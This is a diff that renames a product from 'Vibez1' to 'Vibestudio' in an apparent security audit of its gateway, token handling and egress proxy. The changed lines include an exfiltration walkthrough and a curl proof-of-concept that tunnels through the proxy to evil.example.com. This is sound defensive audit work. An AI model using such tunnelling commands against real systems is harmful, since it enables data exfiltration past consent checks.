@@ -10,7 +10,7 @@
 
 ## Executive Summary
 
-Vibez1's external HTTP surface is **intentionally small** — a single-port TLS gateway multiplexes four namespaces (`/healthz`, `/rpc`, `/_w/`, `/_r/`) plus panel HTML. Authentication is centered on a shared bearer admin token plus per-caller tokens managed by `TokenManager`. For WebSocket attachment Vibez1 has **solid** TLS-fingerprint pinning with a credible proof (bytes-on-wire test) that the app-layer token cannot leak to a mismatched peer.
+Vibestudio's external HTTP surface is **intentionally small** — a single-port TLS gateway multiplexes four namespaces (`/healthz`, `/rpc`, `/_w/`, `/_r/`) plus panel HTML. Authentication is centered on a shared bearer admin token plus per-caller tokens managed by `TokenManager`. For WebSocket attachment Vibestudio has **solid** TLS-fingerprint pinning with a credible proof (bytes-on-wire test) that the app-layer token cannot leak to a mismatched peer.
 
 That said, the audit found **several exploitable or latent weaknesses** that warrant remediation before a public-server deployment:
 
@@ -23,7 +23,7 @@ That said, the audit found **several exploitable or latent weaknesses** that war
 7. **Management API on panel HTTP server does not require auth when `managementToken` is null** (validateManagementAuth returns true). Any caller can enumerate running panels / context IDs. **Severity: Medium** in any non-Electron deployment.
 8. **Historical gateway auth gap for workerd has been remediated.** `/_w/*`
    now requires a caller bearer at the gateway and receives only a gateway-scoped
-   upstream bearer. Inbound `Authorization`, cookies, and `x-vibez1-*`
+   upstream bearer. Inbound `Authorization`, cookies, and `x-vibestudio-*`
    headers are stripped before any workerd proxying.
 9. **Egress proxy CONNECT tunnel (`EgressProxy.handleConnect`) has no provider-matching / consent check** — only requires the two attribution headers to be present. Any worker that can set those headers (which every worker can, via the proxy-auth wiring) tunnels arbitrary TLS traffic without consent enforcement, bypassing the capability/rate-limit/audit path that HTTP requests take. **Severity: High** if workers are untrusted.
 10. **Audit log entries include full request URL** (including query strings, which for many providers carry access tokens). Log records are JSONL files; log injection is blocked by `JSON.stringify`, but secrets landing in logs is the real concern. **Severity: Medium.**
@@ -90,7 +90,7 @@ Both generated at build time from `config.json` with placeholder values (`teamId
 
 ### Egress proxy (loopback only) — `src/server/services/egressProxy.ts`
 
-Binds `127.0.0.1:ephemeral`. Workers and panels set it as their `HTTP_PROXY`. Accepts HTTP requests and CONNECT tunnels. Auth: `x-vibez1-worker-id` + `x-vibez1-proxy-auth` headers. HTTP requests undergo provider-routing → consent → capability → rate-limit → circuit-breaker. CONNECT tunnels **skip all provider checks**.
+Binds `127.0.0.1:ephemeral`. Workers and panels set it as their `HTTP_PROXY`. Accepts HTTP requests and CONNECT tunnels. Auth: `x-vibestudio-worker-id` + `x-vibestudio-proxy-auth` headers. HTTP requests undergo provider-routing → consent → capability → rate-limit → circuit-breaker. CONNECT tunnels **skip all provider checks**.
 
 ### Loopback PKCE (ephemeral) — `packages/shared/src/credentials/flows/loopbackPkce.ts`
 
@@ -104,7 +104,7 @@ Ephemeral `127.0.0.1:0` HTTP server, one path: `GET /callback`. Lifetime is one 
 
 Admin-token checks now use the shared constant-time helper, and `/healthz` /
 route-registry admin auth accept `Authorization: Bearer <token>` rather than
-legacy query-token or `X-Vibez1-Token` carriage. RPC also rejects admin tokens;
+legacy query-token or `X-Vibestudio-Token` carriage. RPC also rejects admin tokens;
 clients must exchange admin authority for a caller token before connecting.
 
 ---
@@ -195,7 +195,7 @@ private async handleConnect(req: IncomingMessage, socket: Duplex, _head: Buffer)
 1. Perform `routeProvider` on the CONNECT authority (host+port → provider manifest's `apiBase` host match).
 2. Require a consent grant for the matched provider; reject if none.
 3. Apply rate limiting and circuit breaker on the CONNECT call.
-4. Alternatively, if Vibez1's threat model trusts all local workers, document that workers are equivalent to the local user.
+4. Alternatively, if Vibestudio's threat model trusts all local workers, document that workers are equivalent to the local user.
 
 ---
 
@@ -242,7 +242,7 @@ passes caller identity to the in-process handler.
 
 **File:** `src/server/services/egressProxy.ts:254–270`
 
-The audit entry serialized to `~/.config/vibez1/logs/credentials-audit-YYYY-MM-DD.jsonl` carries:
+The audit entry serialized to `~/.config/vibestudio/logs/credentials-audit-YYYY-MM-DD.jsonl` carries:
 
 ```ts
 url: targetUrl?.toString() ?? (req.url ?? ""),
@@ -469,7 +469,7 @@ res.setHeader("X-Frame-Options", "DENY");
 ### Walkthrough 3 — CONNECT-tunnel exfiltration
 
 1. Untrusted worker is installed (perhaps from a plugin marketplace).
-2. Worker sets `HTTP_PROXY=http://127.0.0.1:<egressPort>` and `x-vibez1-worker-id` + `x-vibez1-proxy-auth` headers.
+2. Worker sets `HTTP_PROXY=http://127.0.0.1:<egressPort>` and `x-vibestudio-worker-id` + `x-vibestudio-proxy-auth` headers.
 3. Worker issues `CONNECT evil.example.com:443`.
 4. Egress proxy opens raw TLS tunnel to evil.example.com without any consent check. Worker exfiltrates arbitrary data.
 
@@ -550,8 +550,8 @@ F-04 (CONNECT bypass):
 
 ```sh
 curl -x http://127.0.0.1:EGRESS_PORT \
-  -H "x-vibez1-worker-id: any" \
-  -H "x-vibez1-proxy-auth: any" \
+  -H "x-vibestudio-worker-id: any" \
+  -H "x-vibestudio-proxy-auth: any" \
   https://evil.example.com/
 # → upstream body returned without consent check
 ```
